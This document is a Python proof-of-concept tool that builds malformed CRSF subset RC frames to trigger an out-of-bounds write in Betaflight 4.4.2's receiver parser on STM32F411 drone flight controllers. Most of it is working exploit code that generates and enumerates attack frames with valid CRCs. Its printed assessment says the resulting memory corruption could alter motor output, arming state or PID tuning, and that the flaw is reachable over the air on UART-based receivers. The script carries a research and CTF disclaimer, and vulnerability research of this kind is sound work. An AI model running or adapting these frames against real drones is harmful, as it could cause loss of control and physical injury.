#!/usr/bin/env python3
"""
CRSF Subset RC Channel Out-of-Bounds Write

Betaflight 4.4.2's CRSF subset RC frame parser (src/main/rx/crsf.c)
extracts a startChannel from a 5-bit field in the frame header, yielding
values 0-31. Channel data is written to crsfChannelData[startChannel + n]
where crsfChannelData is uint32_t[16] (CRSF_MAX_CHANNEL = 16).

With startChannel >= 13 and 4 channels per subset frame, writes
overflow past crsfChannelData[15] into adjacent global memory.

Exploitability on TinyHawk III Plus:
  - The CRSF parser is the UART-facing path (not directly reachable OTA
    through SPI ELRS, which uses expressLrsSetRcDataFromPayload())
  - Reachable via: physical UART access, or potentially CRSF-over-MSP
    forwarding if such a path exists through MSP command injection
  - On STM32F411 bare metal: no ASLR, no stack canaries, no MMU
  - Controlled uint32_t writes past the array corrupt adjacent globals
  - Exact corruption target depends on linker layout

CRSF Subset RC frame format:
  [SYNC=0xC8] [LEN] [TYPE=0x17] [config_byte] [ch_data...] [CRC]

  config_byte bits:
    [7:3] = startChannel (5 bits, 0-31)
    [2:1] = resolution (00=10bit, 01=11bit, 10=12bit, 11=13bit)
    [0]   = digital switch flag

  Channel packing:
    - 4 channels per frame at chosen resolution
    - Packed sequentially in the ch_data field

This tool generates proof-of-concept CRSF subset RC frames with
various startChannel values to demonstrate the OOB write primitive.

Usage:
  python3 crsf-channel-oob-write.py --analyze
  python3 crsf-channel-oob-write.py --generate --start-channel 28
  python3 crsf-channel-oob-write.py --enumerate

For authorized security research and CTF use only.
"""

import argparse
import json
import os
import struct
import sys

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# CRSF constants
# ---------------------------------------------------------------------------

CRSF_SYNC = 0xC8
CRSF_FRAMETYPE_SUBSET_RC = 0x17
CRSF_MAX_CHANNEL = 16
CRSF_FRAME_SIZE_MAX = 64
CRSF_CRC_POLY = 0xD5  # CRC-8/DVB-S2

# Subset RC resolution modes
RESOLUTIONS = {
    0: {"bits": 10, "name": "10-bit", "max_val": 1023},
    1: {"bits": 11, "name": "11-bit", "max_val": 2047},
    2: {"bits": 12, "name": "12-bit", "max_val": 4095},
    3: {"bits": 13, "name": "13-bit", "max_val": 8191},
}

# startChannel values and their OOB characteristics
STARTCHANNEL_MAX = 31  # 5-bit field


def crc8_dvbs2(data: bytes) -> int:
    """CRC-8/DVB-S2 used by CRSF protocol."""
    crc = 0
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 0x80:
                crc = ((crc << 1) ^ CRSF_CRC_POLY) & 0xFF
            else:
                crc = (crc << 1) & 0xFF
    return crc


def pack_channels(channels: list[int], resolution: int) -> bytes:
    """Pack channel values into CRSF subset RC bit-packed format."""
    bits = RESOLUTIONS[resolution]["bits"]
    total_bits = len(channels) * bits
    total_bytes = (total_bits + 7) // 8
    result = bytearray(total_bytes)

    bit_pos = 0
    for ch_val in channels:
        byte_idx = bit_pos // 8
        bit_offset = bit_pos % 8
        # Write the value across bytes (little-endian bit packing)
        val = ch_val & ((1 << bits) - 1)
        accumulator = val << bit_offset
        remaining = bits + bit_offset
        idx = byte_idx
        while remaining > 0 and idx < len(result):
            result[idx] |= accumulator & 0xFF
            accumulator >>= 8
            remaining -= 8
            idx += 1
        bit_pos += bits

    return bytes(result)


def build_subset_rc_frame(start_channel: int, channels: list[int],
                          resolution: int = 1, digital_switch: bool = False) -> dict:
    """Build a CRSF subset RC frame with the given startChannel.

    Returns the frame bytes and analysis of the OOB write.
    """
    res_info = RESOLUTIONS[resolution]
    config_byte = ((start_channel & 0x1F) << 3) | ((resolution & 0x03) << 1) | (1 if digital_switch else 0)

    ch_data = pack_channels(channels, resolution)
    # CRSF frame: [SYNC] [LEN] [TYPE] [config] [ch_data] [CRC]
    payload = bytes([CRSF_FRAMETYPE_SUBSET_RC, config_byte]) + ch_data
    crc = crc8_dvbs2(payload)
    frame_len = len(payload) + 1  # +1 for CRC
    frame = bytes([CRSF_SYNC, frame_len]) + payload + bytes([crc])

    # Analyze OOB
    end_channel = start_channel + len(channels) - 1
    oob_start = max(start_channel, CRSF_MAX_CHANNEL)
    oob_count = max(0, end_channel - CRSF_MAX_CHANNEL + 1) if end_channel >= CRSF_MAX_CHANNEL else 0
    in_bounds = len(channels) - oob_count

    # Memory offset calculation (uint32_t array)
    sizeof_uint32 = 4
    if oob_count > 0:
        oob_byte_offset = (oob_start - 0) * sizeof_uint32  # relative to array start
        oob_bytes_written = oob_count * sizeof_uint32
    else:
        oob_byte_offset = 0
        oob_bytes_written = 0

    return {
        "frame_hex": frame.hex(),
        "frame_bytes": list(frame),
        "start_channel": start_channel,
        "end_channel": end_channel,
        "num_channels": len(channels),
        "resolution": res_info["name"],
        "config_byte": f"0x{config_byte:02x}",
        "channel_values": channels,
        "in_bounds_writes": in_bounds,
        "oob_writes": oob_count,
        "oob_start_index": oob_start if oob_count > 0 else None,
        "oob_byte_offset_from_array_end": (oob_start - CRSF_MAX_CHANNEL) * sizeof_uint32 if oob_count > 0 else None,
        "oob_bytes_written": oob_bytes_written,
        "crc": f"0x{crc:02x}",
        "is_exploitable": oob_count > 0,
    }


def analyze_vulnerability():
    """Detailed analysis of the CRSF subset RC OOB write."""
    print(f"\n{'='*65}")
    print("CRSF SUBSET RC CHANNEL OOB WRITE ANALYSIS")
    print(f"{'='*65}")

    print(f"\n  Vulnerable code path (crsf.c):")
    print(f"    crsfChannelData[startChannel + n] = value;")
    print(f"    where crsfChannelData is uint32_t[{CRSF_MAX_CHANNEL}]")

    print(f"\n  startChannel source: 5-bit field from config_byte[7:3]")
    print(f"    Range: 0-{STARTCHANNEL_MAX}")
    print(f"    Array bounds: 0-{CRSF_MAX_CHANNEL - 1}")
    print(f"    OOB range: startChannel >= {CRSF_MAX_CHANNEL - 3} (with 4 channels)")

    print(f"\n  OOB write map (4 channels per subset frame):")
    print(f"  {'startCh':>8s}  {'Indices written':>20s}  {'OOB':>6s}  {'Bytes past end':>15s}")
    print(f"  {'-'*8}  {'-'*20}  {'-'*6}  {'-'*15}")

    for sc in range(0, STARTCHANNEL_MAX + 1):
        indices = list(range(sc, sc + 4))
        oob = [i for i in indices if i >= CRSF_MAX_CHANNEL]
        oob_str = f"{len(oob)}/4" if oob else "0/4"
        idx_str = f"[{sc}..{sc+3}]"
        if oob:
            bytes_past = (max(oob) - CRSF_MAX_CHANNEL + 1) * 4
            flag = " ← OOB" if oob else ""
            print(f"  {sc:>8d}  {idx_str:>20s}  {oob_str:>6s}  {bytes_past:>13d}B{flag}")
        elif sc >= 12:  # only show near-boundary and OOB entries
            print(f"  {sc:>8d}  {idx_str:>20s}  {oob_str:>6s}  {'—':>15s}")

    print(f"\n  Maximum OOB reach:")
    max_sc = STARTCHANNEL_MAX
    max_idx = max_sc + 3
    max_bytes_past = (max_idx - CRSF_MAX_CHANNEL + 1) * 4
    print(f"    startChannel={max_sc}: writes indices [{max_sc}..{max_idx}]")
    print(f"    {max_idx - CRSF_MAX_CHANNEL + 1} uint32_t values past array end")
    print(f"    = {max_bytes_past} bytes of controlled global memory corruption")

    print(f"\n  Controlled values:")
    for res_id, info in RESOLUTIONS.items():
        print(f"    {info['name']}: 0 — {info['max_val']} per channel (stored as uint32_t)")

    print(f"\n  Target platform (STM32F411):")
    print(f"    - No ASLR (bare metal, flat memory map)")
    print(f"    - No stack canaries")
    print(f"    - No MMU / MPU (all memory executable)")
    print(f"    - Globals in .bss/.data at fixed addresses")
    print(f"    - Adjacent globals may include critical state:")
    print(f"      · Motor output values")
    print(f"      · PID controller state")
    print(f"      · Arming flags")
    print(f"      · Timer/interrupt configuration")


def enumerate_oob_frames(start_channel: int = None) -> list[dict]:
    """Generate OOB frames for all exploitable startChannel values."""
    frames = []
    test_channels = [1500, 1500, 1500, 1500]  # midpoint values (center stick)

    range_start = start_channel if start_channel is not None else 13
    range_end = (start_channel + 1) if start_channel is not None else (STARTCHANNEL_MAX + 1)

    for sc in range(range_start, range_end):
        frame = build_subset_rc_frame(sc, test_channels, resolution=1)
        if frame["is_exploitable"] or start_channel is not None:
            frames.append(frame)

    return frames


def main():
    parser = argparse.ArgumentParser(
        description="CRSF Subset RC Channel Out-of-Bounds Write"
    )
    parser.add_argument(
        "--analyze", action="store_true",
        help="Detailed analysis of the OOB write vulnerability",
    )
    parser.add_argument(
        "--generate", action="store_true",
        help="Generate a specific OOB frame",
    )
    parser.add_argument(
        "--enumerate", action="store_true",
        help="Enumerate all exploitable startChannel values with frames",
    )
    parser.add_argument(
        "--start-channel", type=int, default=28,
        help="startChannel value for --generate (default: 28)",
    )
    parser.add_argument(
        "--channels", type=str, default="1500,1500,1500,1500",
        help="Comma-separated channel values (default: 1500,1500,1500,1500)",
    )
    parser.add_argument(
        "--resolution", type=int, default=1, choices=[0,1,2,3],
        help="Resolution mode: 0=10bit, 1=11bit, 2=12bit, 3=13bit (default: 1)",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
    )
    args = parser.parse_args()

    print("CRSF Subset RC Channel OOB Write")
    print(f"Array: crsfChannelData[{CRSF_MAX_CHANNEL}] (uint32_t)")
    print(f"startChannel field: 5 bits (0-{STARTCHANNEL_MAX})")
    print(f"Channels per frame: 4")
    print(f"OOB threshold: startChannel >= 13")

    results = {
        "array_size": CRSF_MAX_CHANNEL,
        "startchannel_bits": 5,
        "startchannel_max": STARTCHANNEL_MAX,
        "channels_per_frame": 4,
        "oob_threshold": 13,
    }

    if args.analyze:
        analyze_vulnerability()
        results["mode"] = "analyze"

    if args.generate:
        channels = [int(x.strip()) for x in args.channels.split(",")]
        frame = build_subset_rc_frame(
            args.start_channel, channels,
            resolution=args.resolution,
        )

        print(f"\n{'='*65}")
        print(f"GENERATED FRAME — startChannel={args.start_channel}")
        print(f"{'='*65}")
        print(f"  Frame:       {frame['frame_hex']}")
        print(f"  Config byte: {frame['config_byte']}")
        print(f"  Resolution:  {frame['resolution']}")
        print(f"  Channels:    {frame['channel_values']}")
        print(f"  Indices:     [{frame['start_channel']}..{frame['end_channel']}]")
        print(f"  In-bounds:   {frame['in_bounds_writes']}")
        print(f"  OOB writes:  {frame['oob_writes']}")
        if frame['is_exploitable']:
            print(f"  OOB start:   index {frame['oob_start_index']}")
            print(f"  Bytes past array end: {frame['oob_byte_offset_from_array_end']}")
            print(f"  Total OOB bytes: {frame['oob_bytes_written']}")
        results["frame"] = frame
        results["mode"] = "generate"

    if args.enumerate:
        frames = enumerate_oob_frames()
        print(f"\n{'='*65}")
        print("EXPLOITABLE FRAMES (startChannel >= 13)")
        print(f"{'='*65}")
        print(f"\n  {'startCh':>8s}  {'OOB writes':>11s}  {'Bytes past':>11s}  {'Frame':>20s}")
        print(f"  {'-'*8}  {'-'*11}  {'-'*11}  {'-'*20}")
        for f in frames:
            print(f"  {f['start_channel']:>8d}  {f['oob_writes']:>9d}/4  "
                  f"{f['oob_bytes_written']:>9d}B  {f['frame_hex'][:20]}...")
        results["exploitable_frames"] = frames
        results["mode"] = "enumerate"

    if not any([args.analyze, args.generate, args.enumerate]):
        analyze_vulnerability()

    # Assessment
    print(f"\n{'='*65}")
    print("ASSESSMENT")
    print(f"{'='*65}")
    print("  The CRSF subset RC parser has a classic array bounds violation.")
    print(f"  A 5-bit startChannel field (0-{STARTCHANNEL_MAX}) indexes into a")
    print(f"  {CRSF_MAX_CHANNEL}-element array, allowing up to {(STARTCHANNEL_MAX + 4 - CRSF_MAX_CHANNEL) * 4} bytes")
    print(f"  of controlled writes past the array boundary.")
    print()
    print("  On the TinyHawk III Plus (SPI ELRS), this is NOT directly")
    print("  reachable via OTA — the SPI path uses its own RC unpacker.")
    print("  However, it IS reachable via:")
    print("    1. Physical UART access (attach to CRSF port)")
    print("    2. Potential CRSF-over-MSP forwarding path")
    print()
    print("  On STM32F411 bare metal with no protections, controlled")
    print("  uint32_t writes to adjacent globals is a powerful primitive")
    print("  that could corrupt motor output, arming state, or PID tuning.")
    print()
    print("  For drones with UART-based CRSF receivers (non-SPI),")
    print("  this is directly exploitable OTA after ELRS pairing.")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nResults written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
